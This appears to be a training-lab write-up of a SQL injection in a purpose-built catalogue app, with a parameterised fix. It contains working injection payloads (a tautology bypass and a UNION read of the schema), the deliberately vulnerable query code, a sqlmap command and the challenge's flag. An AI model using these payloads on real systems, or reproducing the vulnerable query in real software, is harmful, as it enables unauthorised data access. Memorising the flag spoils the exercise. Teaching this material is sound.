# 02 Clearance: SQL injection in the catalogue filter

**Target:** `https://northwind-02-clearance.vercel.app`
**Class:** SQL injection, CWE-89
**Solution:** `apps/solve/solve-02.sh`

---

## Statement

No login is required. The catalogue filters by category. Retrieve the withheld
supplier lines that the clearance predicate is supposed to exclude.

---

## How it is solved, step by step

### Step 1. A legitimate filter

```bash
BASE=https://northwind-02-clearance.vercel.app
curl -s -G --data-urlencode 'category=Home' "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+' | sort -u
```

```
NW-HOM-101  NW-HOM-102  NW-HOM-103  NW-HOM-104
```

Four public lines. The withheld lines are absent, because the query applies
`classification = 'public'` as well as the category.

### Step 2. Close the quote

The application's statement, in `app/catalogue/route.js`:

```js
// VULNERABLE (application 02). The filter is concatenated into the statement
// text, so the database parses it as SQL rather than as data.
const sql = `SELECT sku, name, category, price_cents, classification`
          + ` FROM products WHERE category = '${category}'`
          + ` AND classification = 'public' ORDER BY id`;

rows = db().prepare(sql).all();
```

Send `Home' OR 1=1--` and the database receives:

```sql
WHERE category = 'Home' OR 1=1--' AND classification = 'public'
                  ────  ─────  ──
                  end    true   comment
```

- the `'` **closes the string literal**
- `OR 1=1` is **always true**
- `--` **comments out the rest of the line**

```bash
curl -s -G --data-urlencode "category=Home' OR 1=1--" "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+|G24\{[^}]+\}' | sort -u
```

```
NW-GFT-301 … NW-TRD-501  NW-TRD-502  NW-TRD-503  NW-TRD-902  G24{InpuT_Becam3_C0d3}
```

Four rows become sixteen. The clearance filter is gone.

### Step 3. Read the schema instead of the rows

```bash
curl -s -G --data-urlencode \
  "category=x' UNION SELECT sql,name,type,name,0 FROM sqlite_master WHERE type='table'--" \
  "$BASE/catalogue" | grep -oE 'CREATE TABLE[^<]*'
```

```
CREATE TABLE products (
CREATE TABLE settlements (
```

A `UNION` splices a second query onto the first, so the attacker chooses what
the statement returns. It is arbitrary read, not merely a filter bypass.

---

## Two details that cost real time

Both fail **quietly**, which is worse than failing loudly.

### `--` ends at the newline

An earlier version put the predicates on separate lines:

```sql
WHERE category = 'Home' OR 1=1--' AND classification = 'public'
  AND classification = 'public'      ← still parsed, still applied
```

The comment removed only the remainder of its own line. The clearance filter
survived, so the injection returned exactly the public rows and looked like it
had failed. The predicates are now on one line, and the reason is recorded in
the source so the arrangement is not later "tidied" back onto separate lines.

### A UNION needs matching column counts

SQLite refuses a statement whose two halves project different numbers of
columns, so the injected `SELECT` must supply exactly five. Getting that wrong
produces an error rather than a bypass, which is at least loud.

---

## A second finding

The application returns the SQLite error message to the user:

```
We could not load that category. (SQLITE_ERROR: unrecognized token: …)
```

That converts what could be a blind injection into a verbose one, and confirms
the query is reachable at all. It is a finding in its own right and is fixed in
the same pass.

---

## The fix

```js
const sql = `SELECT sku, name, category, price_cents, classification`
          + ` FROM products WHERE category = ? AND classification = 'public'`
          + ` ORDER BY id`;

rows = db().prepare(sql).all(category);
```

One line. The value is bound as data and never parsed as SQL.

An allow-list of permitted categories is a useful **second** layer.
Parameterisation is the actual control.

Worth saying plainly: **"we sanitised it" is not a fix.** Escaping quotes does
not help, because a quote is rarely the only thing an attacker needs.
Blacklisting `OR`, `UNION` and `--` loses against an encoding space far larger
than any list.

---

## Unintended paths, and why they are closed

| Path | Result | Reason |
|---|---|---|
| no authentication at all | by design | the lesson is the query, not access control, and it keeps the demo available if login breaks |
| the search route in the same application | correctly parameterised | two disciplines in one codebase makes the contrast visible |
| the flag row via a legitimate query | impossible | it carries the `withheld` classification, which the clearance predicate excludes |

That last row is there because it was once wrong. In the first version the
flag row sat in a category the public filter could name, so an administrator
saw it with no injection at all. The demonstration looked fine and proved
nothing. It was found by running the reference solution against a legitimate
request, which is worth doing before every demonstration.

---

## Verify it yourself

```bash
BASE=https://northwind-02-clearance.vercel.app bash apps/solve/solve-02.sh
```

For a wider view of the same class, `sqlmap -u "$BASE/catalogue?category=Home" --batch`
will find it unaided. That is worth showing: the manual payload explains the
mechanism, and the tool confirms it.